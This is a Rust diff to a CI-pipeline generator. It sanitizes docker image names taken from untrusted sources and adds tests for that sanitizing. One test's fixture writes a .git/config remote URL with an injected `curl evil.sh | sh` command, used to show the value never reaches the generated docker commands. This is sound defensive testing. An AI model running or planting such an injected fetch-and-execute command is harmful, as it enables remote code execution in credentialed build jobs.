@@ -106,16 +106,32 @@ pub(crate) fn with_versions(
     }
 }
 
+/// The image name the docker rules build and push, in effect for this
+/// project + config: the knob from either docker rule, else the git remote
+/// slug, else the directory name.
+///
+/// The result is always a valid docker reference. The name becomes a literal
+/// shell word in the generated pipeline, and none of its sources are
+/// trustworthy — the slug comes from whatever `.git/config` says, the
+/// directory name from wherever the project happens to sit, and the knob
+/// from a file the editor may have been pointed at. `parse_config` rejects a
+/// malformed knob outright; anything that still gets this far is sanitized
+/// rather than pasted into a command.
+pub fn docker_image(facts: &ProjectFacts, config: &CiboxConfig) -> String {
+    let raw = config
+        .docker_build
+        .image_name
+        .as_deref()
+        .or(config.docker_release.image_name.as_deref())
+        .or(facts.repo_slug.as_deref())
+        .unwrap_or(&facts.dir_name);
+    crate::config::image::coerce_reference(raw)
+}
+
 /// Build every rule with its knobs resolved (facts-derived defaults overlaid
 /// with config overrides) and compute its enabled state.
 pub fn resolve(facts: &ProjectFacts, config: &CiboxConfig) -> Vec<ResolvedRule> {
-    let docker_image = config
-        .docker_build
-        .image_name
-        .clone()
-        .or_else(|| config.docker_release.image_name.clone())
-        .or_else(|| facts.repo_slug.clone())
-        .unwrap_or_else(|| facts.dir_name.clone());
+    let docker_image = docker_image(facts, config);
 
     let rules: Vec<Box<dyn Rule>> = vec![
         Box::new(RustTest {
@@ -358,6 +374,69 @@ mod tests {
             s,
             crate::ir::Step::Run { command, .. } if command.contains("-t fossable/cibox")
         )));
+    }
+
+    /// The commands of every job the docker rules emit for `facts` + `config`
+    fn docker_commands(facts: &ProjectFacts, config: &CiboxConfig) -> Vec<String> {
+        resolve(facts, config)
+            .iter()
+            .filter(|r| r.rule.id().starts_with("docker-"))
+            .flat_map(|r| r.rule.jobs(facts))
+            .flat_map(|job| job.steps)
+            .filter_map(|step| match step {
+                crate::ir::Step::Run { command, .. } => Some(command),
+                _ => None,
+            })
+            .collect()
+    }
+
+    #[test]
+    fn test_hostile_remote_cannot_reach_the_docker_commands() {
+        // The slug comes from whatever .git/config says, and lands in
+        // `docker build -t <image> .` in a job holding registry credentials
+        let dir = tempdir().unwrap();
+        fs::write(dir.path().join("Dockerfile"), "FROM alpine\n").unwrap();
+        fs::create_dir_all(dir.path().join(".git")).unwrap();
+        fs::write(
+            dir.path().join(".git/config"),
+            "[remote \"origin\"]\n\turl = https://host/owner/repo; curl evil.sh | sh\n",
+        )
+        .unwrap();
+        let facts = crate::detection::gather_facts(dir.path());
+        assert!(facts.repo_slug.as_deref().unwrap().contains("curl"));
+
+        let config = CiboxConfig::default();
+        let image = docker_image(&facts, &config);
+        assert_eq!(image, "owner/repo-curl-evil.sh-sh");
+
+        let raw = facts.repo_slug.clone().unwrap();
+        let commands = docker_commands(&facts, &config);
+        for command in &commands {
+            assert!(!command.contains(&raw), "{command:?}");
+        }
+        assert!(commands
+            .iter()
+            .any(|c| *c == format!("docker build -t {image} .")));
+        assert!(commands
+            .iter()
+            .any(|c| *c == format!("docker push {image}")));
+    }
+
+    #[test]
+    fn test_directory_name_is_normalized_into_the_image_name() {
+        // Uppercase and spaces are both legal in a directory name and
+        // rejected by docker
+        let dir = tempdir().unwrap();
+        let project = dir.path().join("My App");
+        fs::create_dir(&project).unwrap();
+        fs::write(project.join("Dockerfile"), "FROM alpine\n").unwrap();
+        let facts = crate::detection::gather_facts(&project);
+
+        let config = CiboxConfig::default();
+        assert_eq!(docker_image(&facts, &config), "my-app");
+        assert!(docker_commands(&facts, &config)
+            .iter()
+            .any(|c| c == "docker build -t my-app ."));
     }
 
     #[test]
